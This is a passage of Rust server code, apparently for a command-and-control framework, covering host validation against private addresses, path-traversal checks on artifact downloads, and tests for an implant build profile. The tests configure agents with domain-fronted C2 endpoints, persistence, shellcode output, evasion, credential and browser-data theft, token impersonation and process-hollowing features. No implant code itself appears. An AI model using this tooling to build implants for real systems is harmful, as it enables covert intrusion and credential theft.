        return Ok(ip);
    }

    // If it's a hostname, perform a DNS lookup via spawn_blocking to avoid
    // blocking the Tokio runtime (std::net::ToSocketAddrs is synchronous).
    let host_owned = host.to_string();
    let addrs: Vec<IpAddr> = tokio::task::spawn_blocking(move || {
        std::net::ToSocketAddrs::to_socket_addrs(&format!("{}:0", host_owned))
            .map(|addrs| addrs.map(|a| a.ip()).collect())
            .unwrap_or_default()
    })
    .await
    .map_err(|e| anyhow::anyhow!("DNS resolution task failed: {e}"))?;

    if addrs.is_empty() {
        anyhow::bail!("could not resolve build host '{}'; unresolvable hosts are rejected to prevent DNS rebinding attacks", host);
    }

    for ip in &addrs {
        if !allow_local && is_private_or_reserved(ip) {
            anyhow::bail!(
                "host '{}' resolves to private/reserved IP {}; \
                 build targets must use public infrastructure addresses \
                 (set allow_local_builds = true in config for local testing)",
                host,
                ip
            );
        }
    }

    // Pin the first resolved IP address so the agent connects directly to
    // the validated address, defeating DNS rebinding.
    Ok(addrs[0])
}

/// Check whether an IP address falls into a private, loopback, link-local,
/// or other reserved range that should not be used as a build target.
///
/// Handles IPv6-mapped IPv4 addresses (e.g. `::ffff:127.0.0.1`) by
/// extracting the embedded IPv4 and checking it against the IPv4 private
/// ranges.
fn is_private_or_reserved(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => is_private_ipv4(v4),
        IpAddr::V6(v6) => {
            // Check for IPv6-mapped IPv4 addresses (e.g. ::ffff:127.0.0.1).
            // These can bypass the IPv4 checks if not explicitly handled.
            if let Some(mapped) = v6.to_ipv4_mapped() {
                return is_private_ipv4(&mapped);
            }
            v6.is_loopback()
            || v6.is_unspecified()
            // IPv6 link-local: fe80::/10
            || is_ipv6_link_local(v6)
            // IPv6 unique local: fc00::/7 (RFC 4193)
            || matches!(v6.segments()[0] & 0xfe00, 0xfc00)
            // IPv4-mapped range ::ffff:0:0/96 is already handled above, but
            // also check IPv6 documentation addresses: 2001:db8::/32
            || matches!(v6.segments(), [0x2001, 0x0db8, ..])
        }
    }
}

/// Check whether an IPv4 address falls into a private, loopback, link-local,
/// or other reserved range.
fn is_private_ipv4(v4: &Ipv4Addr) -> bool {
    // Loopback: 127.0.0.0/8
    v4.is_loopback()
    // Link-local: 169.254.0.0/16  (includes AWS IMDS 169.254.169.254)
    || v4.is_link_local()
    // RFC 1918 private: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
    || v4.is_private()
    // Broadcast / unspecified
    || v4.is_broadcast() || v4.is_unspecified()
    // IETF protocol assignments: 192.0.0.0/24
    || matches!(v4.octets(), [192, 0, 0, ..])
    // TEST-NET-1/2/3: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24
    || matches!(v4.octets(), [192, 0, 2, ..])
    || matches!(v4.octets(), [198, 51, 100, ..])
    || matches!(v4.octets(), [203, 0, 113, ..])
    // Carrier-grade NAT: 100.64.0.0/10
    || matches!(v4.octets(), [100, 64..=127, ..])
}

/// Check if an IPv6 address is in the link-local range fe80::/10.
fn is_ipv6_link_local(v6: &Ipv6Addr) -> bool {
    let segments = v6.segments();
    (segments[0] & 0xffc0) == 0xfe80
}

fn copy_workspace_for_build(src_root: &Path, dst_root: &Path) -> anyhow::Result<()> {
    for entry in std::fs::read_dir(src_root)? {
        let entry = entry?;
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if matches!(
            name.as_ref(),
            "target" | ".git" | ".vscode" | "dist" | "profiles"
        ) {
            continue;
        }
        let dst = dst_root.join(name.as_ref());
        copy_path_recursive(&entry.path(), &dst)?;
    }
    Ok(())
}

fn copy_path_recursive(src: &Path, dst: &Path) -> anyhow::Result<()> {
    let file_type = std::fs::symlink_metadata(src)?.file_type();
    if file_type.is_symlink() {
        return Ok(());
    }
    if file_type.is_dir() {
        std::fs::create_dir_all(dst)?;
        for entry in std::fs::read_dir(src)? {
            let entry = entry?;
            copy_path_recursive(&entry.path(), &dst.join(entry.file_name()))?;
        }
    } else if file_type.is_file() {
        if let Some(parent) = dst.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::copy(src, dst)?;
    }
    Ok(())
}

pub async fn handle_download(
    axum::extract::Path(job_id): axum::extract::Path<String>,
    axum::extract::Extension(user): axum::extract::Extension<AuthenticatedUser>,
    State(app_state): State<Arc<AppState>>,
) -> Result<impl IntoResponse, StatusCode> {
    if !job_id.chars().all(|c| c.is_alphanumeric() || c == '-') {
        return Err(StatusCode::BAD_REQUEST);
    }

    let file_path = if let Some(map) = JOB_MAP.get() {
        let m = map.lock().unwrap();
        let Some(state) = m.get(&job_id) else {
            return Err(StatusCode::NOT_FOUND);
        };
        // P1-28: Only the build owner (or an admin) may download the artifact.
        if state.operator != user.id && !user.has_permission("admin") {
            return Err(StatusCode::FORBIDDEN);
        }
        if state.status != "Completed" {
            return Err(StatusCode::NOT_FOUND);
        }
        state.output_path.clone()
    } else {
        None
    }
    .ok_or(StatusCode::NOT_FOUND)?;

    // P2-13: Re-validate at read time that the stored output_path is within
    // the configured builds directory using canonicalization.  This prevents
    // a tampered / stale JobState from tricking the server into reading an
    // arbitrary file on disk (path traversal).
    {
        let canon_file = std::path::Path::new(&file_path)
            .canonicalize()
            .map_err(|_| StatusCode::NOT_FOUND)?;
        let canon_builds = app_state
            .config
            .builds_output_dir
            .canonicalize()
            .unwrap_or_else(|_| app_state.config.builds_output_dir.clone());
        if !canon_file.starts_with(&canon_builds) {
            tracing::error!(
                "P2-13: download path '{}' escapes builds dir '{}'",
                canon_file.display(),
                canon_builds.display()
            );
            return Err(StatusCode::FORBIDDEN);
        }
    }

    let file = tokio::fs::read(&file_path)
        .await
        .map_err(|_| StatusCode::NOT_FOUND)?;
    let filename = Path::new(&file_path)
        .file_name()
        .and_then(|s| s.to_str())
        .map(str::to_owned)
        .unwrap_or_else(|| format!("agent-{job_id}.enc"));

    let mut headers = axum::http::HeaderMap::new();
    headers.insert(
        axum::http::header::CONTENT_TYPE,
        axum::http::header::HeaderValue::from_static("application/octet-stream"),
    );
    headers.insert(
        axum::http::header::CONTENT_DISPOSITION,
        axum::http::header::HeaderValue::from_str(&format!(
            "attachment; filename=\"{}\"",
            filename
        ))
        .unwrap(),
    );

    Ok((headers, file))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request() -> BuildRequest {
        BuildRequest {
            os: "linux".into(),
            arch: "x86_64".into(),
            format: "exe".into(),
            transport: "tls".into(),
            transport_config: BuildTransportConfig::default(),
            features: BuildFeatures {
                persistence: true,
                ..BuildFeatures::default()
            },
            host: "127.0.0.1".into(),
            port: 8444,
            pin: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".into(),
            key: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=".into(),
            output_dir: None,
            sleep_ms: 5000,
            jitter: 20,
            kill_date: None,
            seed: None,
            version_info: None,
            manifest_preset: None,
            driver_path: None,
        }
    }

    #[test]
    fn server_build_profile_targets_outbound_agent_with_pin() {
        let profile =
            build_profile_from_request("job123", &request(), "test_secret", None).unwrap();
        assert_eq!(profile.package, "agent");
        assert_eq!(profile.bin_name.as_deref(), Some("agent-standalone"));
        assert_eq!(profile.output_name.as_deref(), Some("job123"));
        assert_eq!(
            profile.server_cert_fingerprint.as_deref(),
            Some("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
        );
        assert!(profile.features.contains(&"outbound-c".to_string()));
        assert!(profile.features.contains(&"persistence".to_string()));
    }

    #[test]
    fn server_build_profile_maps_p2p_to_tcp_feature() {
        let mut req = request();
        req.features = BuildFeatures {
            p2p: true,
            ..BuildFeatures::default()
        };

        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();

        assert!(profile.features.contains(&"p2p-tcp".to_string()));
        assert!(!profile.features.contains(&"p2p".to_string()));
    }

    #[test]
    fn server_build_profile_bakes_selected_http_transport() {
        let mut req = request();
        req.transport = "http".into();
        req.transport_config.http_endpoint = Some("https://front.example.com/c2".into());
        req.transport_config.http_host_header = Some("c2.example.com".into());

        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();

        assert_eq!(profile.transport, builder::config::PayloadTransport::Http);
        assert!(profile.features.contains(&"http-transport".to_string()));
        assert_eq!(
            profile.transport_settings.http_endpoint.as_deref(),
            Some("https://front.example.com/c2")
        );
        assert_eq!(
            profile.transport_settings.http_host_header.as_deref(),
            Some("c2.example.com")
        );
    }

    #[test]
    fn server_build_profile_requires_ssh_runtime_auth() {
        let mut req = request();
        req.transport = "ssh".into();

        let err = build_profile_from_request("job123", &req, "test_secret", None).unwrap_err();
        assert!(err.to_string().contains("ssh_username"));

        req.transport_config.ssh_username = Some("operator".into());
        req.transport_config.ssh_auth = Some(common::config::SshAuthConfig::Agent);

        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
        assert_eq!(profile.transport, builder::config::PayloadTransport::Ssh);
        assert!(profile.features.contains(&"ssh-transport".to_string()));
        assert_eq!(
            profile.transport_settings.ssh_username.as_deref(),
            Some("operator")
        );
        assert!(matches!(
            profile.transport_settings.ssh_auth,
            Some(common::config::SshAuthConfig::Agent)
        ));
    }

    #[test]
    fn server_build_profile_applies_behavior_fields() {
        let mut req = request();
        req.os = "windows".into();
        req.format = "shellcode".into();
        req.sleep_ms = 12_345;
        req.jitter = 37;
        req.kill_date = Some("2099-12-31".into());

        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();

        assert_eq!(
            profile.output_format,
            builder::config::PayloadFormat::Shellcode
        );
        assert_eq!(profile.sleep_ms, Some(12_345));
        assert_eq!(profile.jitter, Some(37));
        assert_eq!(profile.kill_date.as_deref(), Some("2099-12-31"));
    }

    #[test]
    fn server_rejects_unsupported_format_combinations() {
        let mut req = request();
        req.format = "shellcode".into();

        let err = build_profile_from_request("job123", &req, "test_secret", None).unwrap_err();

        assert!(err.to_string().contains("windows/x86_64"));
    }

    #[test]
    fn server_build_profile_maps_advertised_feature_fields() {
        let mut req = request();
        // embedded_driver is Windows-only; switch to a Windows build so the
        // validation in validate_embedded_driver_options passes.
        req.os = "windows".into();
        req.driver_path = Some("/opt/drivers/test_driver.xor".into());
        req.features = BuildFeatures {
            persistence: true,
            direct_syscalls: true,
            remote_assist: true,
            stealth: true,
            network_discovery: true,
            forensic_cleanup: true,
            self_reencode: true,
            http_transport: true,
            doh_transport: true,
            ssh_transport: true,
            smb_pipe_transport: true,
            evasion_transform: true,
            p2p: true,
            stack_spoof: true,
            manual_map: true,
            browser_data: true,
            lsa_whisperer: true,
            kernel_callback: true,
            embedded_driver: true,
            evanesco: true,
            syscall_emulation: true,
            cet_bypass: true,
            token_impersonation: true,
            transacted_hollowing: true,
            delayed_stomp: true,
        };

        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
        let expected = [
            "outbound-c",
            "persistence",
            "direct-syscalls",
            "remote-assist",
            "stealth",
            "network-discovery",
            "forensic-cleanup",
            "self-reencode",
            "http-transport",
            "doh-transport",
            "ssh-transport",
            "smb-pipe-transport",
            "evasion-transform",
            "p2p-tcp",
            "stack-spoof",
            "manual-map",
            "browser-data",
            "lsa-whisperer",
            "kernel-callback",
            "embedded_driver",
            "evanesco",
            "syscall-emulation",
            "cet-bypass",
            "token-impersonation",
            "transacted-hollowing",
            "delayed-stomp",
        ];

        for feature in expected {
            assert!(
                profile.features.contains(&feature.to_string()),
                "missing mapped feature {feature}"
            );
        }

        let available = builder::config::read_agent_features().unwrap();
        let (_, unknown) = builder::config::partition_features(&profile.features, &available);
        assert!(
            unknown.is_empty(),
            "server emitted features not declared in agent/Cargo.toml: {unknown:?}"
        );
    }

    #[test]
    fn invalid_cert_pin_is_rejected() {
        assert!(validate_cert_pin("not-a-pin").is_err());
    }

    #[test]
    fn workspace_copy_excludes_target_directory() {
        let src = tempfile::tempdir().unwrap();
        let dst = tempfile::tempdir().unwrap();
        std::fs::write(src.path().join("Cargo.toml"), "[workspace]\n").unwrap();
        std::fs::create_dir_all(src.path().join("agent/src")).unwrap();
        std::fs::write(src.path().join("agent/src/lib.rs"), "").unwrap();
        std::fs::create_dir_all(src.path().join("target/debug")).unwrap();
        std::fs::write(src.path().join("target/debug/large"), "ignore").unwrap();

        copy_workspace_for_build(src.path(), dst.path()).unwrap();

        assert!(dst.path().join("Cargo.toml").exists());
        assert!(dst.path().join("agent/src/lib.rs").exists());
        assert!(!dst.path().join("target").exists());
    }

    // ── output_dir restriction tests ────────────────────────────────────────

    /// Helper: call only the output_dir validation logic extracted from
    /// `execute_build_safely` without running an actual build.
    ///
    /// Returns `Ok(resolved_out_dir)` on success or `Err(msg)` on rejection.
    fn check_output_dir(
        base_build_dir: &std::path::Path,
        user_dir: Option<&str>,
    ) -> anyhow::Result<PathBuf> {
        let mut out_dir = base_build_dir.to_path_buf();

        if let Some(user_dir) = user_dir {
            if !user_dir.trim().is_empty() {
                let requested = PathBuf::from(user_dir.trim());
                let canonical_base = std::fs::canonicalize(base_build_dir)
                    .unwrap_or_else(|_| base_build_dir.to_path_buf());
                let canonical_requested = std::fs::canonicalize(&requested).unwrap_or_else(|_| {
                    let mut acc = PathBuf::new();
                    for component in requested.components() {
                        match component {
                            std::path::Component::RootDir => acc.push("/"),
                            std::path::Component::Prefix(p) => acc.push(p.as_os_str()),
                            std::path::Component::CurDir => {}
                            std::path::Component::ParentDir => {
                                acc.pop();
                            }
                            std::path::Component::Normal(p) => acc.push(p),
                        }
                    }
                    acc
                });
                if canonical_requested.starts_with(&canonical_base) {
                    out_dir = requested;
                } else {
                    anyhow::bail!(
                        "output_dir '{}' must be within the configured builds directory '{}'",
                        user_dir.trim(),
                        base_build_dir.display()
                    );
                }
            }
        }

        Ok(out_dir)
    }

    /// A subdirectory of the configured build dir must be accepted.
    #[test]
    fn output_dir_accepts_subdirectory_of_build_dir() {
        let base = tempfile::tempdir().unwrap();
        let sub = base.path().join("2024-01-01_job");
        std::fs::create_dir_all(&sub).unwrap();
        let result = check_output_dir(base.path(), Some(sub.to_str().unwrap()));
        assert!(result.is_ok(), "subdirectory of build dir must be accepted");
    }

    /// An absolute path that is NOT under the configured build dir must be
    /// rejected with a clear error.
    #[test]
    fn output_dir_rejects_absolute_path_outside_build_dir() {
        let base = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        // outside is a completely different temp dir — not a subdir of base.
        let result = check_output_dir(base.path(), Some(outside.path().to_str().unwrap()));
        assert!(
            result.is_err(),
            "absolute path outside build dir must be rejected"
        );
        assert!(
            result.unwrap_err().to_string().contains("must be within"),
            "error message must explain the restriction"
        );
    }

    /// A path-traversal attempt using `../` must be rejected even if the
    /// resulting path is not the same as passing an absolute outside path.
    #[test]
    fn output_dir_rejects_parent_dir_traversal() {
        let base = tempfile::tempdir().unwrap();
        // Construct a traversal path: <base>/../evil — resolves to the parent of base.
        let traversal = format!("{}/../evil", base.path().display());
        let result = check_output_dir(base.path(), Some(&traversal));
        assert!(
            result.is_err(),
            "parent-dir traversal in output_dir must be rejected"
        );
    }

    /// `None` (not supplied) must silently default to the configured build dir.
    #[test]
    fn output_dir_defaults_to_base_when_none() {
        let base = tempfile::tempdir().unwrap();
        let result = check_output_dir(base.path(), None).unwrap();
        assert_eq!(result, base.path());
    }
}
